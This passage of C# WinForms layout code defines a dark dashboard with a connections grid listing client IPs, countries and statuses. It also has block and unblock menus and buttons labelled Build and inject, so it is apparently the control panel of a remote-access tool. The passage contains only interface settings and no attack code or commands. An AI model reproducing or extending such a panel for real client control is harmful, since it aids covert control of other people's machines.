			this.DrakeUIAvatar6.Text = "DrakeUIAvatar6";
			this.SentBox.Controls.Add(this.senttotal);
			this.SentBox.Controls.Add(this.DrakeUIAvatar7);
			this.SentBox.FillColor = Color.Black;
			this.SentBox.Font = new Font("Segoe UI", 25f);
			this.SentBox.ForeColor = Color.FromArgb(157, 5, 17);
			this.SentBox.Location = new Point(387, 29);
			this.SentBox.Margin = new Padding(5, 6, 5, 6);
			this.SentBox.Name = "SentBox";
			this.SentBox.Padding = new Padding(0, 39, 0, 0);
			this.SentBox.RectColor = Color.FromArgb(157, 5, 17);
			this.SentBox.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.SentBox.Size = new Size(305, 162);
			this.SentBox.Style = UIStyle.Custom;
			this.SentBox.StyleCustomMode = true;
			this.SentBox.TabIndex = 2;
			this.SentBox.Text = "Sent";
			this.senttotal.BackColor = Color.Transparent;
			this.senttotal.Dock = DockStyle.Fill;
			this.senttotal.Font = new Font("Segoe UI", 15f, FontStyle.Bold);
			this.senttotal.ForeColor = Color.White;
			this.senttotal.Location = new Point(0, 39);
			this.senttotal.Margin = new Padding(4, 0, 4, 0);
			this.senttotal.Name = "senttotal";
			this.senttotal.Size = new Size(221, 123);
			this.senttotal.Style = UIStyle.Custom;
			this.senttotal.StyleCustomMode = true;
			this.senttotal.TabIndex = 11;
			this.senttotal.Text = "0 KB";
			this.senttotal.TextAlign = ContentAlignment.MiddleCenter;
			this.DrakeUIAvatar7.BackColor = Color.Transparent;
			this.DrakeUIAvatar7.Cursor = Cursors.Hand;
			this.DrakeUIAvatar7.Dock = DockStyle.Right;
			this.DrakeUIAvatar7.FillColor = Color.Transparent;
			this.DrakeUIAvatar7.Font = new Font("Microsoft Sans Serif", 12f);
			this.DrakeUIAvatar7.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIAvatar7.Location = new Point(221, 39);
			this.DrakeUIAvatar7.Margin = new Padding(4);
			this.DrakeUIAvatar7.Name = "DrakeUIAvatar7";
			this.DrakeUIAvatar7.Size = new Size(84, 123);
			this.DrakeUIAvatar7.Style = UIStyle.Custom;
			this.DrakeUIAvatar7.StyleCustomMode = true;
			this.DrakeUIAvatar7.Symbol = 61678;
			this.DrakeUIAvatar7.SymbolSize = 64;
			this.DrakeUIAvatar7.TabIndex = 13;
			this.DrakeUIAvatar7.Text = "DrakeUIAvatar7";
			this.RecentBox.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.RecentBox.Controls.Add(this.lastclienttext);
			this.RecentBox.Controls.Add(this.lastclientpic);
			this.RecentBox.FillColor = Color.Black;
			this.RecentBox.Font = new Font("Segoe UI", 25f);
			this.RecentBox.ForeColor = Color.FromArgb(157, 5, 17);
			this.RecentBox.Location = new Point(1076, 29);
			this.RecentBox.Margin = new Padding(5, 6, 5, 6);
			this.RecentBox.Name = "RecentBox";
			this.RecentBox.Padding = new Padding(0, 39, 0, 0);
			this.RecentBox.RectColor = Color.FromArgb(157, 5, 17);
			this.RecentBox.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.RecentBox.Size = new Size(335, 162);
			this.RecentBox.Style = UIStyle.Custom;
			this.RecentBox.StyleCustomMode = true;
			this.RecentBox.TabIndex = 3;
			this.RecentBox.Text = "Recent";
			this.lastclienttext.BackColor = Color.Transparent;
			this.lastclienttext.Dock = DockStyle.Fill;
			this.lastclienttext.Font = new Font("Segoe UI", 15f, FontStyle.Bold);
			this.lastclienttext.ForeColor = Color.White;
			this.lastclienttext.Location = new Point(0, 39);
			this.lastclienttext.Margin = new Padding(4, 0, 4, 0);
			this.lastclienttext.Name = "lastclienttext";
			this.lastclienttext.Size = new Size(259, 123);
			this.lastclienttext.Style = UIStyle.Custom;
			this.lastclienttext.StyleCustomMode = true;
			this.lastclienttext.TabIndex = 11;
			this.lastclienttext.Text = "....\r\n....\r\n....";
			this.lastclienttext.TextAlign = ContentAlignment.MiddleCenter;
			this.lastclientpic.BackColor = Color.Transparent;
			this.lastclientpic.Cursor = Cursors.Hand;
			this.lastclientpic.Dock = DockStyle.Right;
			this.lastclientpic.FillColor = Color.Transparent;
			this.lastclientpic.Font = new Font("Microsoft Sans Serif", 12f);
			this.lastclientpic.ForeColor = Color.FromArgb(157, 5, 17);
			this.lastclientpic.Location = new Point(259, 39);
			this.lastclientpic.Margin = new Padding(4);
			this.lastclientpic.Name = "lastclientpic";
			this.lastclientpic.Size = new Size(76, 123);
			this.lastclientpic.Style = UIStyle.Custom;
			this.lastclientpic.StyleCustomMode = true;
			this.lastclientpic.Symbol = 62004;
			this.lastclientpic.SymbolSize = 55;
			this.lastclientpic.TabIndex = 12;
			this.lastclientpic.Text = "DrakeUIAvatar8";
			this.notifiform.SetToolTip(this.lastclientpic, "Logs");
			this.connectionpanel.Controls.Add(this.DataLog);
			this.connectionpanel.Dock = DockStyle.Fill;
			this.connectionpanel.FillColor = Color.FromArgb(225, 245, 254);
			this.connectionpanel.Font = new Font("Microsoft Sans Serif", 12f);
			this.connectionpanel.ForeColor = Color.White;
			this.connectionpanel.Location = new Point(138, 34);
			this.connectionpanel.Margin = new Padding(5, 6, 5, 6);
			this.connectionpanel.Name = "connectionpanel";
			this.connectionpanel.RectColor = Color.Black;
			this.connectionpanel.Size = new Size(1456, 780);
			this.connectionpanel.Style = UIStyle.Custom;
			this.connectionpanel.TabIndex = 14;
			this.connectionpanel.Text = "Connections";
			this.connectionpanel.TitleColor = Color.Black;
			this.connectionpanel.TitleHeight = 0;
			this.DataLog.AccessibleRole = AccessibleRole.None;
			this.DataLog.AllowUserToAddRows = false;
			this.DataLog.AllowUserToDeleteRows = false;
			this.DataLog.AllowUserToResizeColumns = false;
			this.DataLog.AllowUserToResizeRows = false;
			dataGridViewCellStyle8.BackColor = Color.Black;
			dataGridViewCellStyle8.ForeColor = Color.Cyan;
			dataGridViewCellStyle8.SelectionBackColor = Color.White;
			dataGridViewCellStyle8.SelectionForeColor = Color.Black;
			this.DataLog.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle8;
			this.DataLog.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
			this.DataLog.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
			this.DataLog.BackgroundColor = Color.Black;
			this.DataLog.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle9.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle9.BackColor = Color.FromArgb(157, 5, 17);
			dataGridViewCellStyle9.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle9.ForeColor = Color.White;
			dataGridViewCellStyle9.SelectionBackColor = Color.White;
			dataGridViewCellStyle9.SelectionForeColor = Color.Black;
			dataGridViewCellStyle9.WrapMode = DataGridViewTriState.True;
			this.DataLog.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle9;
			this.DataLog.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.DataLog.Columns.AddRange(new DataGridViewColumn[]
			{
				this.DataGridViewImageColumn2,
				this.DataGridViewTextBoxColumn5,
				this.DataGridViewTextBoxColumn4,
				this.DataGridViewTextBoxColumn7,
				this.dattim
			});
			this.DataLog.ContextMenuStrip = this.ctxconnection_1;
			this.DataLog.Cursor = Cursors.Hand;
			dataGridViewCellStyle10.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle10.BackColor = Color.Black;
			dataGridViewCellStyle10.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle10.ForeColor = Color.White;
			dataGridViewCellStyle10.SelectionBackColor = Color.White;
			dataGridViewCellStyle10.SelectionForeColor = Color.FromArgb(10, 0, 10);
			dataGridViewCellStyle10.WrapMode = DataGridViewTriState.False;
			this.DataLog.DefaultCellStyle = dataGridViewCellStyle10;
			this.DataLog.Dock = DockStyle.Fill;
			this.DataLog.EditMode = DataGridViewEditMode.EditProgrammatically;
			this.DataLog.EnableHeadersVisualStyles = false;
			this.DataLog.GridColor = Color.FromArgb(157, 5, 17);
			this.DataLog.Location = new Point(0, 0);
			this.DataLog.Margin = new Padding(4);
			this.DataLog.MultiSelect = false;
			this.DataLog.Name = "DataLog";
			this.DataLog.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle11.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle11.BackColor = Color.Black;
			dataGridViewCellStyle11.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle11.ForeColor = Color.White;
			dataGridViewCellStyle11.SelectionBackColor = Color.White;
			dataGridViewCellStyle11.SelectionForeColor = Color.FromArgb(10, 0, 10);
			dataGridViewCellStyle11.WrapMode = DataGridViewTriState.True;
			this.DataLog.RowHeadersDefaultCellStyle = dataGridViewCellStyle11;
			this.DataLog.RowHeadersVisible = false;
			dataGridViewCellStyle12.BackColor = Color.Black;
			dataGridViewCellStyle12.ForeColor = Color.White;
			dataGridViewCellStyle12.SelectionBackColor = Color.White;
			dataGridViewCellStyle12.SelectionForeColor = Color.FromArgb(10, 0, 10);
			this.DataLog.RowsDefaultCellStyle = dataGridViewCellStyle12;
			this.DataLog.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
			this.DataLog.ShowCellToolTips = false;
			this.DataLog.Size = new Size(1456, 780);
			this.DataLog.TabIndex = 2;
			this.DataLog.Tag = "b";
			this.DataLog.Visible = false;
			this.DataGridViewImageColumn2.HeaderText = "Flag";
			this.DataGridViewImageColumn2.Name = "DataGridViewImageColumn2";
			this.DataGridViewTextBoxColumn5.HeaderText = "ip";
			this.DataGridViewTextBoxColumn5.Name = "DataGridViewTextBoxColumn5";
			this.DataGridViewTextBoxColumn4.HeaderText = "Country";
			this.DataGridViewTextBoxColumn4.Name = "DataGridViewTextBoxColumn4";
			this.DataGridViewTextBoxColumn7.HeaderText = "ClientStatus";
			this.DataGridViewTextBoxColumn7.Name = "DataGridViewTextBoxColumn7";
			this.dattim.HeaderText = "Date";
			this.dattim.Name = "dattim";
			this.ctxconnection_1.BackColor = Color.Black;
			this.ctxconnection_1.Font = new Font("Microsoft Sans Serif", 12f);
			this.ctxconnection_1.ImageScalingSize = new Size(20, 20);
			this.ctxconnection_1.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem1
			});
			this.ctxconnection_1.Name = "ctxconnection";
			this.ctxconnection_1.RenderMode = ToolStripRenderMode.System;
			this.ctxconnection_1.Size = new Size(207, 46);
			this.ToolStripMenuItem1.ForeColor = Color.White;
			this.ToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
			this.ToolStripMenuItem1.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			this.ToolStripMenuItem1.Size = new Size(206, 42);
			this.ToolStripMenuItem1.Text = "Block Client";
			this.blockpanel.Controls.Add(this.DGVblocked);
			this.blockpanel.Dock = DockStyle.Fill;
			this.blockpanel.FillColor = Color.FromArgb(225, 245, 254);
			this.blockpanel.Font = new Font("Microsoft Sans Serif", 12f);
			this.blockpanel.ForeColor = Color.White;
			this.blockpanel.Location = new Point(138, 34);
			this.blockpanel.Margin = new Padding(5, 6, 5, 6);
			this.blockpanel.Name = "blockpanel";
			this.blockpanel.RectColor = Color.Black;
			this.blockpanel.Size = new Size(1456, 780);
			this.blockpanel.Style = UIStyle.Custom;
			this.blockpanel.TabIndex = 15;
			this.blockpanel.Text = "Blocked Clients";
			this.blockpanel.TitleColor = Color.Black;
			this.blockpanel.TitleHeight = 0;
			this.DGVblocked.AccessibleRole = AccessibleRole.None;
			this.DGVblocked.AllowUserToAddRows = false;
			this.DGVblocked.AllowUserToDeleteRows = false;
			this.DGVblocked.AllowUserToResizeColumns = false;
			this.DGVblocked.AllowUserToResizeRows = false;
			dataGridViewCellStyle13.BackColor = Color.Black;
			dataGridViewCellStyle13.ForeColor = Color.Cyan;
			dataGridViewCellStyle13.SelectionBackColor = Color.White;
			dataGridViewCellStyle13.SelectionForeColor = Color.Black;
			this.DGVblocked.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle13;
			this.DGVblocked.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
			this.DGVblocked.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
			this.DGVblocked.BackgroundColor = Color.Black;
			this.DGVblocked.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle14.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle14.BackColor = Color.FromArgb(157, 5, 17);
			dataGridViewCellStyle14.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle14.ForeColor = Color.White;
			dataGridViewCellStyle14.SelectionBackColor = Color.White;
			dataGridViewCellStyle14.SelectionForeColor = Color.Black;
			dataGridViewCellStyle14.WrapMode = DataGridViewTriState.True;
			this.DGVblocked.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle14;
			this.DGVblocked.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.DGVblocked.Columns.AddRange(new DataGridViewColumn[]
			{
				this.DataGridViewImageColumn1,
				this.DataGridViewTextBoxColumn1
			});
			this.DGVblocked.ContextMenuStrip = this.ctxconnection;
			this.DGVblocked.Cursor = Cursors.Hand;
			dataGridViewCellStyle15.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle15.BackColor = Color.Black;
			dataGridViewCellStyle15.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle15.ForeColor = Color.White;
			dataGridViewCellStyle15.SelectionBackColor = Color.White;
			dataGridViewCellStyle15.SelectionForeColor = Color.FromArgb(10, 0, 10);
			dataGridViewCellStyle15.WrapMode = DataGridViewTriState.False;
			this.DGVblocked.DefaultCellStyle = dataGridViewCellStyle15;
			this.DGVblocked.Dock = DockStyle.Fill;
			this.DGVblocked.EditMode = DataGridViewEditMode.EditProgrammatically;
			this.DGVblocked.EnableHeadersVisualStyles = false;
			this.DGVblocked.GridColor = Color.FromArgb(157, 5, 17);
			this.DGVblocked.Location = new Point(0, 0);
			this.DGVblocked.Margin = new Padding(4);
			this.DGVblocked.MultiSelect = false;
			this.DGVblocked.Name = "DGVblocked";
			this.DGVblocked.ReadOnly = true;
			this.DGVblocked.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle16.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle16.BackColor = Color.Black;
			dataGridViewCellStyle16.Font = new Font("Microsoft Sans Serif", 12f);
			dataGridViewCellStyle16.ForeColor = Color.White;
			dataGridViewCellStyle16.SelectionBackColor = Color.White;
			dataGridViewCellStyle16.SelectionForeColor = Color.FromArgb(10, 0, 10);
			dataGridViewCellStyle16.WrapMode = DataGridViewTriState.True;
			this.DGVblocked.RowHeadersDefaultCellStyle = dataGridViewCellStyle16;
			this.DGVblocked.RowHeadersVisible = false;
			dataGridViewCellStyle17.BackColor = Color.Black;
			dataGridViewCellStyle17.ForeColor = Color.White;
			dataGridViewCellStyle17.SelectionBackColor = Color.White;
			dataGridViewCellStyle17.SelectionForeColor = Color.FromArgb(10, 0, 10);
			this.DGVblocked.RowsDefaultCellStyle = dataGridViewCellStyle17;
			this.DGVblocked.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
			this.DGVblocked.ShowCellToolTips = false;
			this.DGVblocked.Size = new Size(1456, 780);
			this.DGVblocked.TabIndex = 2;
			this.DGVblocked.Tag = "b";
			this.DataGridViewImageColumn1.FillWeight = 50.76142f;
			this.DataGridViewImageColumn1.HeaderText = "Flag";
			this.DataGridViewImageColumn1.Name = "DataGridViewImageColumn1";
			this.DataGridViewImageColumn1.ReadOnly = true;
			this.DataGridViewTextBoxColumn1.FillWeight = 149.2386f;
			this.DataGridViewTextBoxColumn1.HeaderText = "ip";
			this.DataGridViewTextBoxColumn1.Name = "DataGridViewTextBoxColumn1";
			this.DataGridViewTextBoxColumn1.ReadOnly = true;
			this.ctxconnection.BackColor = Color.Black;
			this.ctxconnection.Font = new Font("Microsoft Sans Serif", 12f);
			this.ctxconnection.ImageScalingSize = new Size(20, 20);
			this.ctxconnection.Items.AddRange(new ToolStripItem[]
			{
				this.BlockClientToolStripMenuItem
			});
			this.ctxconnection.Name = "ctxconnection";
			this.ctxconnection.RenderMode = ToolStripRenderMode.System;
			this.ctxconnection.Size = new Size(235, 46);
			this.BlockClientToolStripMenuItem.ForeColor = Color.White;
			this.BlockClientToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("BlockClientToolStripMenuItem.Image");
			this.BlockClientToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.BlockClientToolStripMenuItem.Name = "BlockClientToolStripMenuItem";
			this.BlockClientToolStripMenuItem.Size = new Size(234, 42);
			this.BlockClientToolStripMenuItem.Text = "UNBlock Client";
			this.TopPanel.BackColor = Color.Black;
			this.TopPanel.BackgroundImageLayout = ImageLayout.Zoom;
			this.TopPanel.Controls.Add(this.DrakeUIButtonIcon2);
			this.TopPanel.Controls.Add(this.DrakeUIButtonIcon1);
			this.TopPanel.Controls.Add(this.DrakeUIButtonIcon13);
			this.TopPanel.Controls.Add(this.DrakeUIButtonIcon12);
			this.TopPanel.Dock = DockStyle.Top;
			this.TopPanel.Location = new Point(138, 0);
			this.TopPanel.Margin = new Padding(4);
			this.TopPanel.Name = "TopPanel";
			this.TopPanel.Size = new Size(1456, 34);
			this.TopPanel.TabIndex = 2;
			this.DrakeUIButtonIcon2.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon2.Dock = DockStyle.Right;
			this.DrakeUIButtonIcon2.FillColor = Color.Black;
			this.DrakeUIButtonIcon2.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon2.Font = new Font("Arial", 9f);
			this.DrakeUIButtonIcon2.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.Location = new Point(1336, 0);
			this.DrakeUIButtonIcon2.Margin = new Padding(4);
			this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
			this.DrakeUIButtonIcon2.RectColor = Color.Black;
			this.DrakeUIButtonIcon2.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon2.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon2.Size = new Size(30, 34);
			this.DrakeUIButtonIcon2.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon2.StyleCustomMode = true;
			this.DrakeUIButtonIcon2.Symbol = 57365;
			this.DrakeUIButtonIcon2.SymbolSize = 25;
			this.DrakeUIButtonIcon2.TabIndex = 35;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon2, "Store");
			this.DrakeUIButtonIcon1.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon1.Dock = DockStyle.Right;
			this.DrakeUIButtonIcon1.FillColor = Color.Black;
			this.DrakeUIButtonIcon1.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon1.Font = new Font("Arial", 9f);
			this.DrakeUIButtonIcon1.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.Location = new Point(1366, 0);
			this.DrakeUIButtonIcon1.Margin = new Padding(4);
			this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
			this.DrakeUIButtonIcon1.RectColor = Color.Black;
			this.DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon1.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon1.Size = new Size(30, 34);
			this.DrakeUIButtonIcon1.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon1.StyleCustomMode = true;
			this.DrakeUIButtonIcon1.Symbol = 61575;
			this.DrakeUIButtonIcon1.SymbolSize = 25;
			this.DrakeUIButtonIcon1.TabIndex = 34;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon1, "Support");
			this.DrakeUIButtonIcon13.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon13.Dock = DockStyle.Right;
			this.DrakeUIButtonIcon13.FillColor = Color.Black;
			this.DrakeUIButtonIcon13.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon13.Font = new Font("Arial", 9f);
			this.DrakeUIButtonIcon13.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon13.Location = new Point(1396, 0);
			this.DrakeUIButtonIcon13.Margin = new Padding(4);
			this.DrakeUIButtonIcon13.Name = "DrakeUIButtonIcon13";
			this.DrakeUIButtonIcon13.RectColor = Color.Black;
			this.DrakeUIButtonIcon13.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon13.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon13.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon13.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon13.Size = new Size(30, 34);
			this.DrakeUIButtonIcon13.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon13.StyleCustomMode = true;
			this.DrakeUIButtonIcon13.Symbol = 62161;
			this.DrakeUIButtonIcon13.SymbolSize = 25;
			this.DrakeUIButtonIcon13.TabIndex = 33;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon13, "Minimize");
			this.DrakeUIButtonIcon12.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon12.Dock = DockStyle.Right;
			this.DrakeUIButtonIcon12.FillColor = Color.Black;
			this.DrakeUIButtonIcon12.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon12.Font = new Font("Arial", 9f);
			this.DrakeUIButtonIcon12.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon12.Location = new Point(1426, 0);
			this.DrakeUIButtonIcon12.Margin = new Padding(4);
			this.DrakeUIButtonIcon12.Name = "DrakeUIButtonIcon12";
			this.DrakeUIButtonIcon12.RectColor = Color.Black;
			this.DrakeUIButtonIcon12.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon12.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon12.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon12.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon12.Size = new Size(30, 34);
			this.DrakeUIButtonIcon12.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon12.StyleCustomMode = true;
			this.DrakeUIButtonIcon12.Symbol = 61527;
			this.DrakeUIButtonIcon12.SymbolSize = 25;
			this.DrakeUIButtonIcon12.TabIndex = 32;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon12, "Exit");
			this.Panel3.BackColor = Color.Black;
			this.Panel3.Controls.Add(this.Connection_btn);
			this.Panel3.Controls.Add(this.blockbtn);
			this.Panel3.Controls.Add(this.Clients_Btn);
			this.Panel3.Controls.Add(this.clearbtn);
			this.Panel3.Controls.Add(this.Home_Btn);
			this.Panel3.Controls.Add(this.Build_btn);
			this.Panel3.Controls.Add(this.Panel8);
			this.Panel3.Controls.Add(this.Label1);
			this.Panel3.Controls.Add(this.PictureBox1);
			this.Panel3.Controls.Add(this.inject_btn);
			this.Panel3.Controls.Add(this.About_btn);
			this.Panel3.Controls.Add(this.Settings_btn);
			this.Panel3.Cursor = Cursors.SizeAll;
			this.Panel3.Dock = DockStyle.Left;
			this.Panel3.Location = new Point(0, 0);
			this.Panel3.Margin = new Padding(4);
			this.Panel3.Name = "Panel3";
			this.Panel3.Size = new Size(138, 814);
			this.Panel3.TabIndex = 11;
			this.Connection_btn.Cursor = Cursors.Hand;
			this.Connection_btn.Dock = DockStyle.Top;
			this.Connection_btn.FillColor = Color.Black;
			this.Connection_btn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.Connection_btn.FillPressColor = Color.Black;
			this.Connection_btn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.Connection_btn.Font = new Font("Roboto", 9f);
			this.Connection_btn.ForeColor = Color.FromArgb(157, 5, 17);
			this.Connection_btn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.Connection_btn.ImageAlign = ContentAlignment.MiddleLeft;
			this.Connection_btn.Location = new Point(0, 298);
			this.Connection_btn.Margin = new Padding(4);
			this.Connection_btn.Name = "Connection_btn";
			this.Connection_btn.RectColor = Color.Black;
			this.Connection_btn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.Connection_btn.RectHoverColor = Color.White;
			this.Connection_btn.RectPressColor = Color.White;
			this.Connection_btn.RectSelectedColor = Color.White;
			this.Connection_btn.ShowFocusLine = true;
			this.Connection_btn.Size = new Size(138, 54);
			this.Connection_btn.Style = UIStyle.Custom;
			this.Connection_btn.StyleCustomMode = true;
			this.Connection_btn.Symbol = 61926;
			this.Connection_btn.TabIndex = 42;
			this.Connection_btn.Text = "Connection";
			this.Connection_btn.TipsText = "Home";
			this.blockbtn.Cursor = Cursors.Hand;
			this.blockbtn.Dock = DockStyle.Top;
			this.blockbtn.FillColor = Color.Black;
			this.blockbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.blockbtn.FillPressColor = Color.Black;
			this.blockbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.blockbtn.Font = new Font("Roboto", 9f);
			this.blockbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.blockbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.blockbtn.ImageAlign = ContentAlignment.MiddleLeft;
			this.blockbtn.Location = new Point(0, 244);
			this.blockbtn.Margin = new Padding(4);
			this.blockbtn.Name = "blockbtn";
			this.blockbtn.RectColor = Color.Black;
			this.blockbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.blockbtn.RectHoverColor = Color.White;
			this.blockbtn.RectPressColor = Color.White;
			this.blockbtn.RectSelectedColor = Color.White;
			this.blockbtn.ShowFocusLine = true;
			this.blockbtn.Size = new Size(138, 54);
			this.blockbtn.Style = UIStyle.Custom;
			this.blockbtn.StyleCustomMode = true;
			this.blockbtn.Symbol = 61534;
			this.blockbtn.TabIndex = 41;
			this.blockbtn.Text = "BLocked";
			this.blockbtn.TipsText = "Home";
			this.Clients_Btn.Cursor = Cursors.Hand;
			this.Clients_Btn.Dock = DockStyle.Top;
			this.Clients_Btn.FillColor = Color.Black;
			this.Clients_Btn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.Clients_Btn.FillPressColor = Color.Black;
			this.Clients_Btn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.Clients_Btn.Font = new Font("Roboto", 9f);
			this.Clients_Btn.ForeColor = Color.FromArgb(157, 5, 17);
			this.Clients_Btn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.Clients_Btn.ImageAlign = ContentAlignment.MiddleLeft;
			this.Clients_Btn.Location = new Point(0, 190);
			this.Clients_Btn.Margin = new Padding(4);
			this.Clients_Btn.Name = "Clients_Btn";
			this.Clients_Btn.RectColor = Color.Black;
			this.Clients_Btn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.Clients_Btn.RectHoverColor = Color.White;
			this.Clients_Btn.RectPressColor = Color.White;
			this.Clients_Btn.RectSelectedColor = Color.White;
			this.Clients_Btn.ShowFocusLine = true;
			this.Clients_Btn.Size = new Size(138, 54);
			this.Clients_Btn.Style = UIStyle.Custom;
			this.Clients_Btn.StyleCustomMode = true;
			this.Clients_Btn.Symbol = 61447;
			this.Clients_Btn.TabIndex = 40;
			this.Clients_Btn.Text = "Clients";
			this.Clients_Btn.TipsText = "Home";
			this.clearbtn.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.clearbtn.Cursor = Cursors.Hand;
			this.clearbtn.FillColor = Color.Transparent;
			this.clearbtn.Font = new Font("Microsoft Sans Serif", 12f);
			this.clearbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.clearbtn.Location = new Point(49, 360);
			this.clearbtn.Margin = new Padding(4);
			this.clearbtn.Name = "clearbtn";
			this.clearbtn.Padding = new Padding(4);
			this.clearbtn.Size = new Size(35, 39);
			this.clearbtn.Style = UIStyle.Custom;
			this.clearbtn.StyleCustomMode = true;
			this.clearbtn.Symbol = 57469;
			this.clearbtn.SymbolSize = 30;
			this.clearbtn.TabIndex = 11;
			this.clearbtn.Text = "DrakeUIAvatar3";
			this.notifiform.SetToolTip(this.clearbtn, "Clear Logs");
			this.clearbtn.Visible = false;
			this.Home_Btn.Cursor = Cursors.Hand;
			this.Home_Btn.Dock = DockStyle.Top;
			this.Home_Btn.FillColor = Color.Black;
			this.Home_Btn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.Home_Btn.FillPressColor = Color.Black;
			this.Home_Btn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.Home_Btn.Font = new Font("Roboto", 9f);
			this.Home_Btn.ForeColor = Color.FromArgb(157, 5, 17);
			this.Home_Btn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.Home_Btn.ImageAlign = ContentAlignment.MiddleLeft;
			this.Home_Btn.Location = new Point(0, 136);
			this.Home_Btn.Margin = new Padding(4);
